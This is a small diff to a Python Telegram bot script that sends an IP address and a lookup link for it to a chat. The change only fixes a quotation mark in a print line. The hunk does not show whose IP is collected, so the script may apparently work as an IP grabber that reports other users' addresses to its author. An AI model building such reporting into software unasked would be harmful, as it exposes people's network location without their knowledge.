@@ -11,6 +11,6 @@ bot=telepot.Bot(TOKEN)
 bot.sendMessage(chat_id,ip )
 bot.sendMessage(chat_id,'https://whatismyipaddress.com/ip/' + ip)
 
-print("thank you to have used my bot')
+print("thank you to have used my bot")
 
 bot.sendMessage(chat_id,'enjoy ;)')
